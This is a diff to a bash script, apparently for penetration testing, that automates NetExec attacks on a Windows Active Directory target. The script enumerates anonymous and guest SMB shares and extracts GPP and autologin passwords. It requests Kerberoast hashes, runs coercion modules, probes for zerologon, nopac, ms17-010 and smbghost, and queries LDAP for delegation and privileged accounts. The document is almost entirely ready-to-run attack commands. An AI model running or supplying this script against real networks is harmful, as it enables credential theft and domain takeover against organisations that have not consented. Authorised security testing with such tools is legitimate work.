@@ -14,7 +14,7 @@ netexec smb $ip -u '' -p '' --shares
 netexec smb $ip -u 'guest' -p '' --shares 
 
 if [[ -n "$username" ]]; then
-	echo "[*] Basic auth permission ..." 
+	echo "[*] checking current user smb/winrm/rdp/mssql permission ... " 
 	netexec smb $ip -u "$username" -p "$password"   
 	netexec winrm $ip -u "$username" -p "$password"  
 	netexec rdp $ip -u "$username" -p "$password"    
@@ -23,8 +23,9 @@ if [[ -n "$username" ]]; then
 	echo "[*] Enum smb share folder ..." 
 	netexec smb $ip -u "$username" -p "$password" --shares 
 	
-	echo "[*] Enum gpp_autologin via smb ..." 
+	echo "[*] Enum autologin via smb ..." 
 	netexec smb $ip -u "$username" -p "$password" -M gpp_autologin 
+	netexec smb $ip -u "$username" -p "$password" -M reg-winlogon
 	
 	echo "[*] Enum gpp_password via smb ..." 
 	netexec smb $ip -u "$username" -p "$password" -M gpp_password  
@@ -40,7 +41,7 @@ if [[ -n "$username" ]]; then
 	
 	echo "[*] Enum kerberoasting ..." 
 	netexec ldap $ip -u "$username" -p "$password" --kerberoasting __netexec_kerberoasting.txt 
-	
+
 	echo "[*] ldap-checker via ldap ..." 
 	netexec ldap $ip -u "$username" -p "$password" -M ldap-checker 
 	
@@ -65,29 +66,27 @@ fi
 echo "[*] Attack : spooler ..." 
 netexec smb $ip -u "$username" -p "$password" -M spooler 
 
-echo "[*] Attack : dfscoerce ..." 
-netexec smb $ip -u "$username" -p "$password" -M dfscoerce 
-
-echo "[*] Attack : shadowcoerce ..." 
-netexec smb $ip -u "$username" -p "$password" -M shadowcoerce 
-
-echo "[*] Attack : printerbug ..." 
-netexec smb $ip -u "$username" -p "$password" -M printerbug 
+echo "[*] Attack: coerce_plus  ..." 
+netexec smb $ip -u "$username" -p "$password" -M coerce_plus
 
 echo "[*] Attack : nopac ..." 
-netexec smb $ip -u "$username" -p "$password" -M nopac 
+netexec smb $ip -u "$username" -p "$password" -M nopac --timeout=30
 
 echo "[*] Attack : zerologon ..." 
-netexec smb $ip -u "$username" -p "$password" -M zerologon 
+netexec smb $ip -u "$username" -p "$password" -M zerologon --timeout=30
 
 echo "[*] Attack : ms17-010 ..." 
-netexec smb $ip -u "$username" -p "$password" -M ms17-010 
+netexec smb $ip -u "$username" -p "$password" -M ms17-010 --timeout=30
 
-echo "[*] ioxidresolver ..." 
+echo "[*] Attack : smbghost ..." 
+netexec smb $ip -u "$username" -p "$password" -M smbghost --timeout=30
+
+echo "[*] Attack : ioxidresolver ..." 
 netexec smb $ip -u "$username" -p "$password" -M ioxidresolver 
 
-echo "[*] enum av via smb ..." 
+echo "[*] Enum AV via smb ..." 
 netexec smb $ip -u "$username" -p "$password" -M enum_av 
+netexec smb $ip -u "$username" -p "$password" -M wcc
 
 echo "[*] Enum ADCS ..." 
 netexec ldap $ip -u "$username" -p "$password" -M adcs 
@@ -99,11 +98,26 @@ netexec ldap $ip -u "$username" -p "$password" -M enum_trusts
 echo "[*] Enum password-not-required ..." 
 netexec ldap $ip -u "$username" -p "$password" --password-not-required 
 
-echo "[*] Enum trusted for delegation ..." 
+echo "[*] Enum trusted for delegation and Unconstrained ..." 
 netexec ldap $ip -u "$username" -p "$password" --trusted-for-delegation 
 
+echo "[*] Enum TRUSTED_FOR_DELEGATION  ..." 
+netexec ldap $ip -u "$username" -p "$password" --query "(userAccountControl:1.2.840.113556.1.4.803:=524288)" "sAMAccountName"
+
+echo "[*] Enum TRUSTED_TO_AUTH_FOR_DELEGATION  ..." 
+netexec ldap $ip -u "$username" -p "$password" --query "(userAccountControl:1.2.840.113556.1.4.803:=16777216)" "sAMAccountName"
+
+echo '[*] Enum msds-allowedtodelegateto / Get-netUser -TrustedToAuth ...'
+netexec ldap $ip -u "$username" -p "$password" --query "(msds-allowedtodelegateto=*)" "sAMAccountName"
+
+echo '[*] Enum adminCount = 1'
+netexec ldap $ip -u "$username" -p "$password" --query "(adminCount=1)" "sAMAccountName"
+
+echo '[*] Enum DoesNotRequirePreAuth & adminCount = 1'
+netexec ldap $ip -u "$username" -p "$password" --query "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(adminCount=1))" "sAMAccountName"
+
 echo "[*] Enum pre 2000 computer  ..." 
-netexec ldap $ip -u "$username" -p "$password" --query "(userAccountControl=4128)" "sAMAccountName" 
+netexec ldap $ip -u "$username" -p "$password" -M pre2k
 
 echo "[*] Get-desc-users via ldap ..." 
 netexec ldap $ip -u "$username" -p "$password" -M get-desc-users 
@@ -131,4 +145,3 @@ netexec ldap $ip -u "$username" -p "$password" -M subnets
 
 echo "[*] user-desc via ldap ..." 
 netexec ldap $ip -u "$username" -p "$password" -M user-desc 
-
